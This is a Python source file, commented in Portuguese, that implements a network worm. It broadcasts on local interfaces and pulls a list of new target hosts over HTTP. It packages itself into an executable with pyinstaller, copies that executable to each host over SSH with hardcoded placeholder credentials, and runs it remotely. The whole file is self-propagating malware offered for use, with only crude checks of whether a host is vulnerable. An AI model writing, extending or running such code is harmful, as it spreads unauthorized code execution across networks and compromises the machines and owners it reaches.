import os
import socket
from threading import Thread
from urllib.request import urlopen
import netifaces
import subprocess
import paramiko  # Biblioteca para SSH e SCP

class Worm:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.vulnerable_hosts = [self.target_ip]
        self.broadcast_thread = Thread(target=self.broadcast_scan)
        self.communication_thread = Thread(target=self.communication_handler)

    def generate_executable(self):
        print("Gerando arquivo executável...")
        script_name = "worm_script.py"  # Nome do script Python que deve ser convertido
        executable_name = "worm_executable.exe"  # Nome do arquivo executável gerado
        os.system(f'pyinstaller --onefile --name {executable_name} {script_name}')
        return f"dist/{executable_name}"  # Caminho do arquivo executável gerado

    def establish_connection(self, host_ip, target_port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host_ip, target_port))
                s.sendall(b'Hello, server')
                response = s.recv(1024)
                print(f"Resposta do servidor: {response.decode()}")
        except Exception as e:
            print(f"Erro ao estabelecer conexão com {host_ip}:{target_port} - {e}")

    def communication_handler(self):
        while True:
            print(f"[HOST INFECTADO] Esperando novas conexões...")
            self.establish_connection(self.target_ip, self.target_port)

            try:
                with urlopen(f"http://{self.target_ip}:{self.target_port}/new_hosts.txt") as response:
                    new_hosts = response.read().decode().splitlines()
                    for new_host in new_hosts:
                        if new_host not in self.vulnerable_hosts:
                            self.vulnerable_hosts.append(new_host)
                            print(f"[+] Novo host vulnerável encontrado: {new_host}")
                            if new_host != self.target_ip:
                                self.execute_infection(new_host)
            except Exception as e:
                print(f"Erro ao obter novos hosts: {e}")

    def is_vulnerable(self, host_ip):
        print(f"Verificando vulnerabilidade no host: {host_ip}")
        try:
            # Tenta conectar à porta especificada para verificar se está aberta
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)  # Define um tempo limite de 1 segundo para a conexão
                s.connect((host_ip, self.target_port))
                return True
        except (socket.timeout, socket.error):
            return False

    def execute_infection(self, host_ip):
        print(f"Infectando o host: {host_ip}...")
        if self.is_vulnerable(host_ip):
            executable_file = self.generate_executable()
            self.copy_executable_to_host(host_ip, executable_file)
            self.run_executable_on_host(host_ip, executable_file)
        else:
            print(f"Host {host_ip} não é vulnerável.")

    def copy_executable_to_host(self, host_ip, executable_file):
        print(f"Copiando o executável para o host: {host_ip}...")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host_ip, username='user', password='password')  # Ajuste o usuário e senha
            sftp = ssh.open_sftp()
            sftp.put(executable_file, f'/tmp/{os.path.basename(executable_file)}')
            sftp.close()
            ssh.close()
            print(f"Executável copiado para o host {host_ip} com sucesso.")
        except Exception as e:
            print(f"Erro ao copiar o executável para o host {host_ip} - {e}")

    def run_executable_on_host(self, host_ip, executable_file):
        print(f"Executando o executável no host: {host_ip}...")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host_ip, username='user', password='password')  # Ajuste o usuário e senha
            ssh.exec_command(f'chmod +x /tmp/{os.path.basename(executable_file)} && /tmp/{os.path.basename(executable_file)}')
            ssh.close()
            print(f"Executável executado no host {host_ip} com sucesso.")
        except Exception as e:
            print(f"Erro ao executar o executável no host {host_ip} - {e}")

    def broadcast_scan(self):
        broadcast_data = bytes(f"{self.target_ip} {self.target_port}".encode())
        for interface in netifaces.interfaces():
            if "lo" not in interface:  # Ignora a interface loopback
                try:
                    ifaddr = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
                    if ifaddr:
                        broadcast_address = ifaddr[0]['broadcast']
                        print(f"Broadcasting em {interface} ({broadcast_address})")
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as broadcast_socket:
                            broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                            broadcast_socket.sendto(broadcast_data, (broadcast_address, 0))
                except Exception as e:
                    print(f"Erro ao enviar pacote de broadcast: {str(e)}")

    def run(self):
        self.broadcast_thread.start()
        self.communication_thread.start()

if __name__ == "__main__":
    worm = Worm('192.168.1.1', 22)  # Altere o IP do alvo e a porta conforme necessário
    worm.run()
